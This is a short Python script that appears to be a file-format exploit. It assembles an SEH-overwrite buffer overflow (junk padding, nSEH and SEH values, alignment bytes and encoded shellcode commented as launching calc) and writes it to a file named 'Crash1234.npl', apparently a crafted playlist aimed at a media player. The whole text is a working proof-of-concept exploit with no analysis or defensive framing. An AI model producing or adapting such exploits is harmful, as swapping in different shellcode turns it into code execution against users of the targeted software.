junk="\x44" * 2660
shellcode = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBdK8lPU4KjLS8o0mPO0LoQXc3QQPlpcdMa5YhnpVXgWRs920wkOXPA" #calc shellcode
nseh="\x61\xC5" 
align = "\x61\x6D\x61\x6D\x50\x6E\xC3"
 
seh="\xEF\x42"
 
junk2="\xcc"*45 
junk3="\xcc"*850
buff=junk+nseh+seh+align+junk2+shellcode+junk3
magic = open("Crash1234.npl","w")
 
magic.write(buff)
 
magic.close()